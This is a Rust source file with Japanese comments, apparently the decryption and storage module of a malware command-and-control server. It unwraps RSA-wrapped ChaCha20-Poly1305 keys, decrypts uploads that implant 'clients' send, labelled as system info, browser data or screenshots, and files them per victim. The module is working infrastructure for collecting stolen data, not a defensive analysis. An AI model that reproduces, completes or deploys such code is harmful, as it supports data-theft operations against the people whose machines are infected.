// C2サーバーでの暗号化処理モジュール
use anyhow::{Result, Context};
use chacha20poly1305::{
    aead::{Aead, KeyInit},
    ChaCha20Poly1305, Key, Nonce,
};
use rsa::{
    pkcs8::DecodePrivateKey,
    Oaep, RsaPrivateKey,
};
use serde::{Deserialize, Serialize};
use sha2::Sha256;
use std::path::Path;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EncryptedPackage {
    pub client_id: String,
    pub timestamp: u64,
    pub encrypted_data_file: String,     // 暗号化されたデータファイルのパス
    pub wrapped_key_file: String,        // RSAでラップされたキー・ナンスファイルのパス
    pub metadata: PackageMetadata,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PackageMetadata {
    pub original_size: usize,
    pub encrypted_size: usize,
    pub compression_used: bool,
    pub data_type: String,              // "system_info", "browser_data", "screenshot", etc.
}

#[derive(Debug, Clone)]
pub struct ServerCrypto {
    private_key_path: String,
    storage_base_path: String,
}

impl ServerCrypto {
    /// 新しいServerCryptoインスタンスを作成
    pub fn new<P: AsRef<Path>>(private_key_path: P, storage_base_path: P) -> Self {
        Self {
            private_key_path: private_key_path.as_ref().to_string_lossy().to_string(),
            storage_base_path: storage_base_path.as_ref().to_string_lossy().to_string(),
        }
    }

    /// 秘密鍵を読み込み
    fn load_private_key(&self) -> Result<RsaPrivateKey> {
        // ファイル存在確認
        if !std::path::Path::new(&self.private_key_path).exists() {
            anyhow::bail!(
                "Private key file not found: {}\n\
                 Please ensure the private key exists or set AOI64_PRIVATE_KEY_PATH environment variable.",
                self.private_key_path
            );
        }

        let pem_bytes = std::fs::read(&self.private_key_path)
            .with_context(|| format!("Failed to read private key from {}", self.private_key_path))?;
        
        let pem_str = std::str::from_utf8(&pem_bytes)
            .context("Private key PEM is not valid UTF-8")?;
        
        RsaPrivateKey::from_pkcs8_pem(pem_str)
            .with_context(|| format!("Failed to parse private key PEM from {}", self.private_key_path))
    }

    /// RSAでラップされたキー・ナンスを復号化
    pub fn unwrap_key_nonce(&self, wrapped_data: &[u8]) -> Result<([u8; 32], [u8; 12])> {
        let private_key = self.load_private_key()?;
        let padding = Oaep::new::<Sha256>();
        
        let decrypted = private_key
            .decrypt(padding, wrapped_data)
            .context("Failed to decrypt wrapped key/nonce with RSA")?;

        if decrypted.len() != 44 {
            anyhow::bail!("Decrypted key/nonce has invalid length: {} (expected 44)", decrypted.len());
        }

        let mut key = [0u8; 32];
        let mut nonce = [0u8; 12];
        key.copy_from_slice(&decrypted[..32]);
        nonce.copy_from_slice(&decrypted[32..44]);
        
        Ok((key, nonce))
    }

    /// ChaCha20-Poly1305でデータを復号化
    pub fn decrypt_data(&self, encrypted_data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Result<Vec<u8>> {
        let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
        
        cipher
            .decrypt(Nonce::from_slice(nonce), encrypted_data)
            .map_err(|e| anyhow::anyhow!("Failed to decrypt data with ChaCha20-Poly1305: {:?}", e))
    }

    /// 暗号化パッケージを完全に復号化
    pub fn decrypt_package(&self, package: &EncryptedPackage) -> Result<Vec<u8>> {
        // ラップされたキー・ナンスを読み込み
        let wrapped_key_data = std::fs::read(&package.wrapped_key_file)
            .with_context(|| format!("Failed to read wrapped key file: {}", package.wrapped_key_file))?;

        // キー・ナンスを復号化
        let (key, nonce) = self.unwrap_key_nonce(&wrapped_key_data)?;

        // 暗号化されたデータを読み込み
        let encrypted_data = std::fs::read(&package.encrypted_data_file)
            .with_context(|| format!("Failed to read encrypted data file: {}", package.encrypted_data_file))?;

        // データを復号化
        let decrypted_data = self.decrypt_data(&encrypted_data, &key, &nonce)?;

        Ok(decrypted_data)
    }

    /// 受信した暗号化データを保存して復号化
    pub fn process_encrypted_upload(
        &self,
        client_id: &str,
        encrypted_data: &[u8],
        wrapped_key: &[u8],
        data_type: &str,
    ) -> Result<Vec<u8>> {
        let timestamp = chrono::Utc::now().timestamp() as u64;
        
        // ファイル名を生成
        let data_filename = format!("{}_{}_data.enc", client_id, timestamp);
        let key_filename = format!("{}_{}_key.bin", client_id, timestamp);
        
        let data_path = format!("{}/{}", self.storage_base_path, data_filename);
        let key_path = format!("{}/{}", self.storage_base_path, key_filename);

        // ストレージディレクトリを作成
        std::fs::create_dir_all(&self.storage_base_path)
            .context("Failed to create storage directory")?;

        // ファイルに保存
        std::fs::write(&data_path, encrypted_data)
            .with_context(|| format!("Failed to write encrypted data to {}", data_path))?;
        std::fs::write(&key_path, wrapped_key)
            .with_context(|| format!("Failed to write wrapped key to {}", key_path))?;

        // パッケージメタデータを作成
        let package = EncryptedPackage {
            client_id: client_id.to_string(),
            timestamp,
            encrypted_data_file: data_path,
            wrapped_key_file: key_path,
            metadata: PackageMetadata {
                original_size: 0, // 復号化後に設定
                encrypted_size: encrypted_data.len(),
                compression_used: false,
                data_type: data_type.to_string(),
            },
        };

        // 復号化を実行
        let decrypted_data = self.decrypt_package(&package)?;

        // メタデータファイルも保存（後の管理用）
        let metadata_filename = format!("{}_{}_metadata.json", client_id, timestamp);
        let metadata_path = format!("{}/{}", self.storage_base_path, metadata_filename);
        
        let mut updated_package = package;
        updated_package.metadata.original_size = decrypted_data.len();
        
        let metadata_json = serde_json::to_string_pretty(&updated_package)
            .context("Failed to serialize package metadata")?;
        std::fs::write(&metadata_path, metadata_json)
            .with_context(|| format!("Failed to write metadata to {}", metadata_path))?;

        Ok(decrypted_data)
    }

    /// 保存された暗号化パッケージ一覧を取得
    pub fn list_packages(&self) -> Result<Vec<EncryptedPackage>> {
        let mut packages = Vec::new();
        
        if !Path::new(&self.storage_base_path).exists() {
            return Ok(packages);
        }

        let entries = std::fs::read_dir(&self.storage_base_path)
            .context("Failed to read storage directory")?;

        for entry in entries {
            let entry = entry.context("Failed to read directory entry")?;
            let path = entry.path();
            
            if let Some(filename) = path.file_name().and_then(|n| n.to_str()) {
                if filename.ends_with("_metadata.json") {
                    let content = std::fs::read_to_string(&path)
                        .with_context(|| format!("Failed to read metadata file: {:?}", path))?;
                    
                    let package: EncryptedPackage = serde_json::from_str(&content)
                        .with_context(|| format!("Failed to parse metadata JSON: {:?}", path))?;
                    
                    packages.push(package);
                }
            }
        }

        // タイムスタンプでソート（新しい順）
        packages.sort_by(|a, b| b.timestamp.cmp(&a.timestamp));
        
        Ok(packages)
    }

    /// 特定のクライアントのパッケージを取得
    pub fn get_client_packages(&self, client_id: &str) -> Result<Vec<EncryptedPackage>> {
        let all_packages = self.list_packages()?;
        Ok(all_packages
            .into_iter()
            .filter(|p| p.client_id == client_id)
            .collect())
    }

    /// パッケージを削除
    pub fn delete_package(&self, package: &EncryptedPackage) -> Result<()> {
        let metadata_filename = format!(
            "{}/{}_metadata.json",
            self.storage_base_path,
            package.client_id
        );
        let files_to_remove = vec![
            &package.encrypted_data_file,
            &package.wrapped_key_file,
            &metadata_filename,
        ];

        for file_path in files_to_remove {
            if Path::new(file_path).exists() {
                std::fs::remove_file(file_path)
                    .with_context(|| format!("Failed to delete file: {}", file_path))?;
            }
        }

        Ok(())
    }
}

/// RSA公開鍵をPEMファイルから読み込み（クライアント用のユーティリティ）
pub fn load_public_key_pem<P: AsRef<Path>>(public_key_path: P) -> Result<String> {
    std::fs::read_to_string(public_key_path.as_ref())
        .with_context(|| format!("Failed to read public key from {:?}", public_key_path.as_ref()))
}

// TODO: 統合テストを別途実装予定